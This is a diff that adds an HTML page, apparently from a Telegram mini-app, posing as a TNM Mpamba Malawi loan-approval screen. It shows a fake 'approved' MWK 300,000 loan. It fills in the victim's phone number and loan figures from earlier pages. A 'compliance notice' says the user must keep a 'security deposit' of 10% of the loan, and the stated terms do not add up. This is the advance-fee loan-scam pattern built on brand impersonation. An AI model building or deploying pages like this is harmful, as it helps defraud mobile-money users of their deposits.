@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TNM Mpamba Malawi - Success</title>
+    
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --tnm-green: #38b000;
+            --tnm-green-dark: #2d9100;
+            --tnm-gradient: linear-gradient(180deg, #4ed310 0%, #38b000 100%);
+            --tnm-dark: #121820;
+            --bg-color: #ffffff;
+            --text-dark: #121820;
+            --text-muted: #666666;
+            --warning-bg: #f2fbf0;
+            --warning-border: #38b000;
+            --warning-title: #258500;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--tnm-green);
+            margin: 0;
+            padding: 20px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .screen-container {
+            width: 100%;
+            max-width: 400px;
+            background-color: var(--bg-color);
+            border-radius: 28px;
+            padding: 30px 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Checkmark Circle Icon */
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--tnm-gradient);
+            color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 38px;
+            font-weight: 900;
+            margin-bottom: 20px;
+            box-shadow: 0 6px 16px rgba(56, 176, 0, 0.35);
+        }
+
+        /* Title Header */
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--tnm-dark);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .sub-text {
+            color: var(--text-muted);
+            font-size: 15px;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Approved Amount TNM Card */
+        .amount-box {
+            width: 100%;
+            background: var(--tnm-gradient);
+            border-radius: 16px;
+            padding: 22px 15px;
+            text-align: center;
+            color: #ffffff;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(56, 176, 0, 0.3);
+        }
+
+        .amount-label {
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
+
+        .amount-value {
+            font-size: 32px;
+            font-weight: 900;
+            letter-spacing: 0.5px;
+        }
+
+        /* Notice Card */
+        .info-card {
+            width: 100%;
+            background-color: var(--warning-bg);
+            border: 1.5px solid var(--warning-border);
+            border-radius: 16px;
+            padding: 20px 18px;
+            margin-bottom: 25px;
+        }
+
+        .info-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 12px;
+            color: var(--warning-title);
+            font-weight: 800;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .info-body {
+            font-size: 13.5px;
+            line-height: 1.55;
+            color: #4a4a4a;
+        }
+
+        /* Detail List */
+        .details-list {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .details-heading {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .detail-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 16px;
+        }
+
+        .icon-bg {
+            width: 44px;
+            height: 44px;
+            background-color: #f2fbf0;
+            border: 1px solid #d4f0ce;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .detail-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-weight: 700;
+            margin-bottom: 2px;
+        }
+
+        .detail-val {
+            font-size: 15px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        /* Quick Actions */
+        .action-title {
+            width: 100%;
+            font-weight: 800;
+            margin: 15px 0 12px;
+            color: var(--tnm-dark);
+            font-size: 15px;
+        }
+
+        .btn-list {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .btn-white {
+            background: white;
+            border: 1px solid #e2e8f0;
+            padding: 14px 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            color: var(--text-dark);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-white:hover {
+            background-color: #f8fafc;
+        }
+
+        .next-steps {
+            width: 100%;
+            background-color: #f8f9fa;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #edf2f7;
+        }
+
+        .home-btn {
+            background-color: var(--tnm-green);
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(56, 176, 0, 0.35);
+            transition: background-color 0.2s;
+        }
+
+        .home-btn:hover {
+            background-color: var(--tnm-green-dark);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="screen-container">
+        
+        <!-- Header Checkmark -->
+        <div class="check-circle">✓</div>
+        
+        <div class="congrats-title">
+            <span>🎉</span> Congratulations!
+        </div>
+
+        <div class="sub-text">
+            Your TNM Mpamba loan has been <b>approved!</b> Funds will be disbursed shortly.
+        </div>
+
+        <!-- Approved Amount TNM Card -->
+        <div class="amount-box">
+            <div class="amount-label">APPROVED AMOUNT</div>
+            <div class="amount-value" id="display-amount">MWK 300,000</div>
+        </div>
+
+        <!-- Compliance Notice -->
+        <div class="info-card">
+            <div class="info-header">⚠️ COMPLIANCE NOTICE</div>
+            <div class="info-body">
+                Your TNM Mpamba account must remain active and maintain a security balance of at least <b>10% of your requested loan amount</b>. This security deposit is fully refundable upon successful loan repayment and unlocks higher limits.
+            </div>
+        </div>
+
+        <!-- Details Section -->
+        <div class="details-list">
+            <div class="details-heading">
+                <span>💳</span> Loan Details
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">🇲🇼</div>
+                <div>
+                    <div class="detail-label">PHONE NUMBER</div>
+                    <div class="detail-val" id="display-phone">+265 ...</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">💵</div>
+                <div>
+                    <div class="detail-label">MONTHLY REPAYMENT</div>
+                    <div class="detail-val" id="display-monthly">MWK 27,000</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📅</div>
+                <div>
+                    <div class="detail-label">LOAN TENURE</div>
+                    <div class="detail-val" id="display-term">12 Months</div>
+                </div>
+            </div>
+
+            <div class="detail-item">
+                <div class="icon-bg">📈</div>
+                <div>
+                    <div class="detail-label">INTEREST RATE</div>
+                    <div class="detail-val">5% APR</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Quick Actions -->
+        <div class="action-title">Quick Actions</div>
+        <div class="btn-list">
+            <div class="btn-white">💰 Deposit</div>
+            <div class="btn-white">💸 Withdraw</div>
+            <div class="btn-white">📄 Statements</div>
+        </div>
+
+        <!-- Next Steps -->
+        <div class="next-steps">
+            <div style="font-weight: 800; color: var(--tnm-dark); margin-bottom: 6px; font-size: 14px;">📱 Next Steps:</div>
+            <div style="font-size: 13px; color: var(--text-muted); line-height: 1.45;">
+                You will receive a TNM Mpamba confirmation SMS with your disbursement details within 24 hours.
+            </div>
+        </div>
+
+        <button class="home-btn" onclick="window.location.href='/page1'">🏠 Back to Home</button>
+
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            if (window.Telegram?.WebApp) {
+                window.Telegram.WebApp.ready();
+                window.Telegram.WebApp.expand();
+            }
+
+            // Retrieve stored data from earlier pages
+            const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "881234567";
+            const loanAmount = localStorage.getItem('loan_amount') || localStorage.getItem('amount') || "300000";
+            const loanTerm = localStorage.getItem('loan_term') || localStorage.getItem('duration') || "12";
+            const monthlyPay = localStorage.getItem('monthly_repayment') || localStorage.getItem('monthly') || "27000";
+
+            // Format values with MWK (Malawian Kwacha) currency
+            const numAmount = Number(loanAmount.toString().replace(/\D/g, '')) || 300000;
+            const numMonthly = Number(monthlyPay.toString().replace(/\D/g, '')) || 27000;
+
+            const formattedAmount = "MWK " + numAmount.toLocaleString('en-US');
+            const formattedMonthly = "MWK " + numMonthly.toLocaleString('en-US');
+
+            // Clean & format Malawi phone (+265)
+            let rawPhone = savedPhone.replace(/\D/g, '');
+            if (rawPhone.startsWith('265')) {
+                rawPhone = rawPhone.slice(3);
+            }
+            const formattedPhone = rawPhone ? `+265 ${rawPhone}` : "+265 ...";
+
+            // Bind values to the UI
+            document.getElementById('display-amount').innerText = formattedAmount;
+            document.getElementById('display-phone').innerText = formattedPhone;
+            document.getElementById('display-term').innerText = loanTerm + " Months";
+            document.getElementById('display-monthly').innerText = formattedMonthly;
+        });
+    </script>
+</body>
+</html>
